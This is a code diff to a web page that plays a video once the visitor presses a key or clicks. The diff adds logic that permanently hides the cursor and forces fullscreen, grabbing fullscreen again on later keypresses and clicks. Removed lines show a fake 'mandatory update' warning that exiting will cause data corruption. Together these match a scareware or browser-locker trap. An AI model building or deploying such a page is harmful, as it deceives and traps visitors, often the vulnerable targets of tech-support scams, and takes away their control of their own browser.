@@ -19,6 +19,7 @@
       align-items:center;
       justify-content:center;
       padding:24px;
+      cursor: none !important; /* Always hide cursor after video starts */
     }
     .box{
       width:min(560px, 100%);
@@ -28,6 +29,7 @@
       padding:22px;
       text-align:center;
       box-shadow:0 20px 60px rgba(0,0,0,.5);
+      cursor: default; /* But show cursor on loading UI */
     }
     h1{margin:0;font-size:18px;font-weight:800}
     p{margin:10px 0 0;color:#cbd5e1;font-size:14px;line-height:1.45}
@@ -53,9 +55,12 @@
       background:#000;
       border-radius:12px;
       box-shadow:0 20px 60px rgba(0,0,0,.5);
+      cursor: none !important;
     }
 
-    .hide-cursor{cursor:none!important}
+    .video-started body {
+      cursor: none !important;
+    }
   </style>
 </head>
 <body>
@@ -83,66 +88,112 @@
   const clickContinue = document.getElementById("clickContinue");
 
   let started = false;
+  let isInFullscreen = false;
+  let userInitiatedFullscreen = false;
+
+  // =========================
+  // Fullscreen state management
+  // =========================
+  function updateFullscreenState() {
+    isInFullscreen = !!(document.fullscreenElement || 
+                       document.webkitFullscreenElement || 
+                       document.mozFullScreenElement || 
+                       document.msFullscreenElement);
+    
+    // Always keep cursor hidden after video starts
+    // No cursor restoration logic here
+  }
+
+  // Listen for fullscreen changes
+  document.addEventListener('fullscreenchange', updateFullscreenState);
+  document.addEventListener('webkitfullscreenchange', updateFullscreenState);
+  document.addEventListener('mozfullscreenchange', updateFullscreenState);
+  document.addEventListener('MSFullscreenChange', updateFullscreenState);
+
+  // Function to enter fullscreen
+  function enterFullscreen() {
+    if (isInFullscreen) return;
+    
+    userInitiatedFullscreen = true;
+    
+    if (vid.requestFullscreen) {
+      vid.requestFullscreen().catch(e => {
+        console.log('Fullscreen request failed:', e);
+        userInitiatedFullscreen = false;
+      });
+    } else if (vid.webkitRequestFullscreen) {
+      vid.webkitRequestFullscreen().catch(e => {
+        console.log('Fullscreen request failed:', e);
+        userInitiatedFullscreen = false;
+      });
+    } else if (vid.mozRequestFullScreen) {
+      vid.mozRequestFullScreen().catch(e => {
+        console.log('Fullscreen request failed:', e);
+        userInitiatedFullscreen = false;
+      });
+    } else if (vid.msRequestFullscreen) {
+      vid.msRequestFullscreen().catch(e => {
+        console.log('Fullscreen request failed:', e);
+        userInitiatedFullscreen = false;
+      });
+    }
+  }
+
+  // Function to re-enter fullscreen on user interaction
+  function attemptReEnterFullscreen(e) {
+    if (!started) return;
+    
+    // If we're not in fullscreen, try to re-enter
+    if (!isInFullscreen && !userInitiatedFullscreen) {
+      // Prevent default behavior for certain keys
+      if (e && e.type === 'keydown' && (e.code === 'Space' || e.key === ' ')) {
+        e.preventDefault();
+      }
+      
+      // Try to enter fullscreen again
+      enterFullscreen();
+    }
+  }
 
   // =========================
   // Adaptive preload policy
-  // - API missing => aggressive
-  // - 3g+ => aggressive
-  // - 2g/slow-2g or Save-Data => conservative
   // =========================
   function getNetworkProfile() {
     const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
 
-    // 🚀 API missing → go AGGRESSIVE
     if (!c) return { mode: "aggressive", reason: "no-api" };
 
     const saveData = !!c.saveData;
-    const type = (c.effectiveType || "").toLowerCase(); // slow-2g | 2g | 3g | 4g
-    const downlink = typeof c.downlink === "number" ? c.downlink : null;
+    const type = (c.effectiveType || "").toLowerCase();
 
-    // Always respect Save-Data
-    if (saveData) return { mode: "conservative", reason: "save-data", type, downlink };
+    if (saveData) return { mode: "conservative", reason: "save-data", type };
 
-    // Very slow networks only
     if (type === "slow-2g" || type === "2g") {
-      return { mode: "conservative", reason: "very-slow", type, downlink };
+      return { mode: "conservative", reason: "very-slow", type };
     }
 
-    // 🔥 3G AND UP = AGGRESSIVE
     if (type === "3g" || type === "4g") {
-      return { mode: "aggressive", reason: "3g-or-better", type, downlink };
+      return { mode: "aggressive", reason: "3g-or-better", type };
     }
 
-    // Fallback on downlink estimate (if provided)
-    if (downlink !== null && downlink >= 2) {
-      return { mode: "aggressive", reason: "downlink>=2mbps", type, downlink };
-    }
-
-    // Default fallback → aggressive
-    return { mode: "aggressive", reason: "default-aggressive", type, downlink };
+    return { mode: "aggressive", reason: "default-aggressive", type };
   }
 
   function applyPreloadPolicy(profile) {
-    // "metadata" = minimal, "auto" = browser may fetch more
     if (profile.mode === "conservative") {
       vid.preload = "metadata";
-      statusEl.textContent = "Please wait, exiting this can cause data corruption, this update is mandatory.";
       return { warmup: false };
     }
 
-    // aggressive
     vid.preload = "auto";
-    statusEl.textContent = "Please wait, exiting this can cause data corruption, this update is mandatory.";
     return { warmup: true };
   }
 
   function kickOffFetch() {
-    // nudges browser to begin fetch with the chosen preload policy
     try { vid.load(); } catch (_) {}
   }
 
   async function warmupMuted() {
-    // muted autoplay warmup: primes decoding/buffering for fast start
     try {
       vid.muted = true;
       const p = vid.play();
@@ -160,7 +211,7 @@
   kickOffFetch();
   if (warmup) warmupMuted();
 
-  // Re-evaluate if the network changes (if API exists)
+  // Re-evaluate if the network changes
   const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
   if (conn && typeof conn.addEventListener === "function") {
     conn.addEventListener("change", () => {
@@ -172,40 +223,56 @@
     });
   }
 
-  // Show click fallback after 5 seconds if no gesture
+  // Show click fallback after 10 seconds
   setTimeout(() => {
     if (!started) prompt.style.display = "block";
   }, PROMPT_AFTER_MS);
 
   // =========================
-  // User gesture start: unmute + play + fullscreen
+  // Initial user gesture start
   // =========================
   function start(e) {
     if (started) return;
     started = true;
 
-    // prevent scroll on Space
     if (e?.type === "keydown" && (e.code === "Space" || e.key === " ")) e.preventDefault();
 
-    // swap UI
+    // Show video
     loadingUI.remove();
     vid.style.display = "block";
 
-    // gesture-authorized actions
+    // Add class to body to hide cursor permanently
+    document.body.classList.add('video-started');
+    
+    // Hide cursor on body (works even when not in fullscreen)
+    document.body.style.cursor = 'none';
+
+    // Unmute and play
     vid.muted = false;
     vid.volume = 1;
-
-    // keep "gesture context" strong: don't await between these
     vid.play().catch(() => {});
-    if (vid.requestFullscreen) vid.requestFullscreen().catch(() => {});
 
-    // optional cursor hide once fullscreen starts (simple)
-    document.body.classList.add("hide-cursor");
+    // Enter fullscreen
+    enterFullscreen();
+
+    // Add event listeners for re-entering fullscreen
+    window.addEventListener("keydown", attemptReEnterFullscreen, true);
+    window.addEventListener("pointerdown", attemptReEnterFullscreen, true);
+    window.addEventListener("click", attemptReEnterFullscreen, true);
+    
+    // Also add mousemove listener to hide cursor if it appears
+    document.addEventListener('mousemove', function() {
+      document.body.style.cursor = 'none';
+    });
   }
 
+  // Initial event listeners for starting
   window.addEventListener("keydown", start, true);
   window.addEventListener("pointerdown", start, true);
   clickContinue.addEventListener("click", start);
+
+  // Initial fullscreen state check
+  updateFullscreenState();
 </script>
 
 </body>
